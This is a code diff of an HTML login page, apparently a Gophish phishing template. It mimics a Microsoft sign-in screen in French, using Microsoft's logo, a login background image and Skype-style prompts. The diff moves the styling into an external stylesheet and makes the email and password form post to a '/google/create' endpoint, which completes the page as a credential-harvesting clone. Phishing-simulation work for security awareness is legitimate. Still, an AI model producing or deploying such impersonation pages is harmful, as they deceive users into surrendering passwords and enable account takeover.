@@ -7,165 +7,7 @@
     <title>Connectez-vous à votre compte</title>
     <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
-    <style>
-        @font-face {
-            font-family: 'Segoe UI Webfont';
-            font-weight: normal;
-            font-style: normal;
-        }
-
-        body {
-            margin: 0;
-            background-image: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/mslogin.png?raw=true');
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            background-size: cover;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Segoe UI Webfont', -apple-system, 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima',
-                'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga',
-                'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI',
-                'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft
-                PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text',
-                'Cambria Math';
-            flex-direction: column;
-        }
-
-        .login-container {
-            background: white;
-            padding: 40px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 440px;
-            width: 100%;
-            text-align: left;
-        }
-
-        .login-header {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-
-        .form-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .form-control {
-            border: none;
-            border-bottom: 1px solid #1b1b1b;
-            border-radius: 0;
-            height: calc(1.5em + .75rem + 2px);
-            padding: .375rem .75rem;
-            font-size: 1rem;
-        }
-
-        .form-control:focus {
-            border-bottom: 2px solid #0078d4;
-            box-shadow: none;
-            outline: none;
-        }
-
-        .form-control.error {
-            border-bottom: 1px solid #e81123;
-        }
-
-        .error-message {
-            color: #d93025;
-            font-size: 0.875em;
-            margin-top: 0.25em;
-            display: none;
-        }
-
-        .btn-primary {
-            color: black;
-            background-color: #CCCCCC;
-            border-color: #CCCCCC;
-            border-radius: 0;
-            font-size: 1rem;
-            width: 120px;
-            margin-right: 10px;
-            padding: 3px;
-        }
-
-        .btn-primary:hover {
-            color: black;
-            background-color: #B2B2B2;
-            border-color: #B2B2B2;
-        }
-
-        .btn-2 {
-            color: white;
-            background-color: #0067B8;
-            border-color: #0067B8;
-            border-radius: 0;
-            font-size: 1rem;
-            width: 120px;
-        }
-
-        .btn-2:hover {
-            color: white;
-            background-color: #005DA6;
-            border-color: #005DA6;
-        }
-
-        .text-links a:hover {
-            text-decoration: underline;
-            color: #6C7378;
-        }
-
-        .divider {
-            width: 100%;
-            height: 1px;
-            background-color: #ccc;
-            margin: 20px 0;
-        }
-
-        a {
-            color: #0067B8;
-        }
-
-        .option-connexion {
-            color: black;
-        }
-
-        .div-option-connexion {
-            background: white;
-            padding: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 440px;
-            width: 100%;
-            text-align: left;
-            margin-top: 20px;
-        }
-
-        .div-option-connexion:hover {
-            background: #CCCCCC;
-        }
-
-        .horizontal-links {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-
-        .horizontal-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .text-links {
-            text-align: left;
-        }
-
-        .button-container {
-            display: flex;
-            justify-content: flex-end;
-        }
-    </style>
+    <link rel="stylesheet" href="/style/google.css"/>
     <script>
         function validateForm() {
             const email = document.getElementById('email');
@@ -210,11 +52,11 @@
             <p style="font-size: 24px; line-height: 28px; font-family: Segoe UI; margin-top: 15px; font-weight: 600;">
                 Se connecter</p>
         </div>
-        <form action="" method="POST" autocomplete="off">
+        <form action="/google/create" method="POST" autocomplete="off">
             <div class="form-group">
                 <span id="email-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez
                     une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.</span>
-                <input type="email" class="form-control" id="email" name="email" placeholder="E-mail, téléphone, ou identifiant Skype" value="{{.Email}}" required=""/>
+                <input type="email" class="form-control" id="email" name="email" placeholder="E-mail, téléphone, ou identifiant Skype" required=""/>
             </div>
             <div class="form-group">
                 <span id="password-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez
@@ -228,7 +70,7 @@
                         compte n’est pas accessible ?</a></p>
             </div>
             <div class="button-container">
-                <button type="button" class="btn btn-primary" onclick="window.location.href = &#39; &#39;" style="margin-right: 4px; width: 114px;">Retour</button>
+                <button type="button" class="btn btn-primary" onclick="window.location.href = '/';" style="margin-right: 4px; width: 114px;">Retour</button>
                 <button type="submit" class="btn btn-primary btn-2" onclick="handleRedirect(event)" style="margin-right: 0px; width: 114px">Suivant</button>
             </div>
         </form>
